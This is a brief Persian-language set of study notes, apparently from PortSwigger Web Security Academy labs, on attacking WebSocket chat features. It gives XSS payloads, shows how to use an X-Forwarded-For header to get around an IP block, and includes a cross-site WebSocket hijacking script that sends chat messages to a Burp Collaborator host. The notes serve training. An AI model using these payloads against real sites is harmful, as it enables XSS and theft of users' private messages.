# Web Socket

## Concept
- برخی ترافیک ها (مانند Chat های وبسایت ها) از جنس WebSocket می باشند، که ترافیک آن های از بخش Proxy > WebSockets history قابل مشاهده است.

## Exploit
- **دستکاری message**
  - با ارسال پیام در بخش چت وبسایت، مشاهده می شود که ترافیک URL-Encode می گردد
  - باید ترافیک را intercept کرده و payload را در Burp وارد کنیم
  - برای حمله XSS از payload زیر استفاده می کنیم:
```HTML
<img src=1 onerror='alert(1)'>
```

- **دستکاری handshake**
  - به بخش WebSoket history رفته و پیام ارسال شده را به Repeater ارسال می کنیم.
  - با تزریق اسکریپت XSS، اگر محافظتی روی ورودی باشد، ممکن است که IP ما بلاک شود. برای بای پاس کردن، هدر ```X-Forwarded-For: 1.1.1.1``` را به درخواست اضافه می کنیم.
  - در همان صفحه بر روی *Connect* کلیک می کنیم تا مجددا ارتباط WebSocket برقرار گردد.
  - از payload زیر برای حمله XSS استفاده می کنیم:
```HTML
<img src=1 oNeRrOr=alert`1`>
```

- **حمله Cross-site**
  - با هر بار referesh شدن صفحه chat یک پیام Ready ارسال شده و سپس کل چت ها در یافت می شو
  - اسکریپت زیر را در سرور exploit بارگذاری کرده و Burp Collaborator را فعال می کنیم
  - با اجرای exploit و سپس کلیک بر روی pull now در Burp Collaborator می توانیم متن چت ها را در بخش Request هر درخواست مشاهده کنیم
```Javascript
<script>
  var ws = new WebSocket('wss://ac6a1fe71f20cbd5c0f34cee007e00d1.web-security-academy.net/chat');
  ws.onopen = function() {
    ws.send("READY");
  };
  ws.onmessage = function(event) {
    fetch('https://3imb5t376kouqoqgmnifykmwcnid62.burpcollaborator.net/?', {method: 'POST', mode: 'no-cors', body: event.data});
  };
</script> 
```
